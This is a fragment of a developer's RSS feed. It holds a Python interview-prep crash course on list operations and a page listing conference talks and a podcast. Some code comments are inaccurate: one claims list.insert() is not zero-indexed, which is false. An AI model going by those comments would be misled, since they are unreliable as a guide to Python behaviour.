Python Crash Course But why Python? Basic operations Data structures Arrays Python Crash Course The following is a crash course in Python that I&amp;rsquo;ve used to refresh my knowledge and understanding of the langauge from a high level.</description>
      <content:encoded><![CDATA[<h1 id="the-no-nonsense-interview-prep">The No Nonsense Interview Prep</h1>
<p>The following is interview preperation material
for software engineer and development roles
that covers the most common aspects of data structures,
algorithms, design, and behavioral.</p>
<p>This interview manual is ever evolving;
I make changes to it frequently as my experience grows
and I find new resources.</p>
<div class="toc">
  <nav id="TableOfContents">
  <ul>
    <li><a href="#python-crash-course">Python Crash Course</a>
      <ul>
        <li><a href="#but-why-python">But why Python?</a></li>
        <li><a href="#basic-operations">Basic operations</a></li>
      </ul>
    </li>
    <li><a href="#data-structures">Data structures</a>
      <ul>
        <li><a href="#arrays">Arrays</a></li>
      </ul>
    </li>
  </ul>
</nav>
</div>


<h2 id="python-crash-course">Python Crash Course</h2>
<p>The following is a crash course in Python
that I&rsquo;ve used to refresh my knowledge and understanding of the langauge
from a high level.</p>
<h3 id="but-why-python">But why Python?</h3>
<p>The last thing you want to do during a technical white board interview
is stumble over weird or complicated syntax, forget how some library works,
or waste time sketching out alot of boilerplate.</p>
<p>Further, because of how <em>close</em> python is to normal spoken language,
even if the person interviewing you doesn&rsquo;t have a firm grasp of python,
they <em>will</em> understand what you&rsquo;re trying to do.</p>
<p>In short, it&rsquo;s all about communication.
Python is easy to communicate,
reason about,
simple to understand,
and reduces the overall complexity of your technical interview.</p>
<p>Python is just really simple and un-complicated.</p>
<h3 id="basic-operations">Basic operations</h3>
<h2 id="data-structures">Data structures</h2>
<h3 id="arrays">Arrays</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#75715e"># initializing arrays with array values</span>
</span></span><span style="display:flex;"><span>arr <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use `append()` to insert a new value at end of the array.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is a O(1) operation but may require that we</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># grow the underlying datastructure to accommodate the new element.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># An understand of how arrays &#34;grow&#34; under the hood as we add elements</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># is a necessary part of understanding the time complexity of using arrays.</span>
</span></span><span style="display:flex;"><span>arr<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use insert() to insert a value at a specific position.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This inserts 5 at the 2nd position. This is NOT zero indexed.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is a O(n) operation in the worst case given all elements</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># may need to be &#34;shifted&#34; or the underlying array may need to grow</span>
</span></span><span style="display:flex;"><span>arr<span style="color:#f92672">.</span>insert(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># We can perform an in place sort.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># The `arr` will now be sorted.</span>
</span></span><span style="display:flex;"><span>arr<span style="color:#f92672">.</span>sort()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This returns a sorted copy where `arr` is not mutated.</span>
</span></span><span style="display:flex;"><span>sorted(arr)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># You may apply a lambda to the sorting.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># A lambda is essentially an &#34;anonymous&#34; function</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># that can take any arbitrary number of inputs.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This example uses an arbitrary &#34;student&#34; class</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># that has some &#34;grade_point_average&#34; data member.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># For the `.sort()` method, we can supply a key</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># and in this example, use the student&#39;s gradepoint averages</span>
</span></span><span style="display:flex;"><span>student<span style="color:#f92672">.</span>sort(key<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> student: student<span style="color:#f92672">.</span>grade_point_average)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reverses the array.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ever get a &#34;reverse string&#34; question? Just use this!</span>
</span></span><span style="display:flex;"><span>arr<span style="color:#f92672">.</span>reverse()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Returns the index of the first occurrence of the given element.</span>
</span></span><span style="display:flex;"><span>arr<span style="color:#f92672">.</span>index(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Removes the first occurence of the given element</span>
</span></span><span style="display:flex;"><span>arr<span style="color:#f92672">.</span>remove(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Returns true if element is in the array</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># The time complexity of this is O(n) in order to scan the whole array</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">in</span> arr:
</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">&#39;2 is in the array!&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Creates a shallow copy (where compound objects are only REFERENCES, not deep copies)</span>
</span></span><span style="display:flex;"><span>copy<span style="color:#f92672">.</span>copy(arr)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Creates a deep copy which recursively inserts copies of any nest, compound objects</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Most of the time, during interview quetsions, you probably want a deep copy</span>
</span></span><span style="display:flex;"><span>copy<span style="color:#f92672">.</span>deepcopy(arr)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Returns the minimum element within the array</span>
</span></span><span style="display:flex;"><span>min(arr)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Returns the maximum element within the array</span>
</span></span><span style="display:flex;"><span>max(arr)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Slicing is very useful where array[start:stop:step]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># So, for example, this prints the array starting at the second element</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># and going in reverse order. It&#39;d look something like &#34;[2, 1]&#34;</span>
</span></span><span style="display:flex;"><span>print(arr[<span style="color:#ae81ff">1</span>::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># List comprehension in python is also super powerful during interviews.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># You need 3 things to do list comprehension:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. And input sequence</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. An iterator</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. A logical condition</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Wrap all of that in the `[ ]` array syntax</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># and you&#39;ll end up with a new array.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># In this example, we are taking x to the power of 2</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># where x is the list of number from 0 to 5</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># but we only take numbers if they are modulo % 2.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># All this in one line!</span>
</span></span><span style="display:flex;"><span>[x<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>) <span style="color:#66d9ef">if</span> x <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>]
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title></title>
      <link>https://johncodes.com/talks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://johncodes.com/talks/</guid>
      <description>Talks Inquires: talks@johncodes.com
2022 The Risks of Single Maintainer Dependencies I spoke at Kubecon EU 2021 on my experience maintaining spf13/cobra with a very small group of other contributors.
Business of Open Source: Exploring the Risks of Single Maintainer Dependencies with John McBride During my time in Spain for Kubecon EU &amp;lsquo;22, I also appeared on the &amp;ldquo;Business of Open Source&amp;rdquo; podcast to discuss maintaining cobra and what startups considering opening sourcing their technologies can learn.</description>
      <content:encoded><![CDATA[<h1 id="talks">Talks</h1>
<p>Inquires: <a href="mailto:talks@johncodes.com">talks@johncodes.com</a></p>
<h2 id="2022">2022</h2>
<hr>
<h3 id="the-risks-of-single-maintainer-dependencies">The Risks of Single Maintainer Dependencies</h3>
<p>I spoke at Kubecon EU 2021 on my experience maintaining spf13/cobra
with a very small group of other contributors.</p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/YBsDnXXW_d8" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

<h4 id="business-of-open-source-exploring-the-risks-of-single-maintainer-dependencies-with-john-mcbride">Business of Open Source: Exploring the Risks of Single Maintainer Dependencies with John McBride</h4>
<p>During my time in Spain for Kubecon EU &lsquo;22,
I also appeared on the &ldquo;Business of Open Source&rdquo; podcast to discuss maintaining cobra
and what startups considering opening sourcing their technologies can learn.</p>
<p><a href="https://share.transistor.fm/s/51727ee9">You can listen to the episode here</a>.</p>
<hr>
<h3 id="neovimconf-2022-lua-a-primer">NeovimConf 2022: Lua, A Primer</h3>
<p>Configuring Nvim via Lua is a powerful, native, and fast way to get your Nvim editor environment just how you like it.
But what <em>IS</em> Lua?</p>
<p>Well, in this talk, we&rsquo;ll explore the essentials of this amazing &amp; simple language.
You&rsquo;ll learn how to use it effectively within Nvim, how to create a simple Lua plugin,
and how to use it on it&rsquo;s own via it&rsquo;s interpreter.</p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/gjIl5Sfh2QQ" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

<hr>
<h3 id="distributed-shared-team-configurations-with-oh-my-zsh">Distributed Shared Team Configurations With Oh-My-Zsh</h3>
<p>Team knowledge, configurations, and infrastructure access can be challenging in a distributed world.
Have you ever asked ‚Äúwhat‚Äôs that command we use?‚Äù
or ‚ÄúWhere are the secrets to access that environment?‚Äù - well this talk is for you!</p>
<p>In this talk, I explore using Oh-My-Zsh, a powerful Zsh configuration framework,
in order to share team knowledge, distribute common configurations, and share infrastructure access.
I also discuss the real world scenario this use case emerged from,
challenges faced in this approach, and how you can leverage Oh-My-Zsh for your distributed devops teams.</p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/ppvjyibyrEg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

]]></content:encoded>
    </item>
    
    
    
  </channel>
</rss>
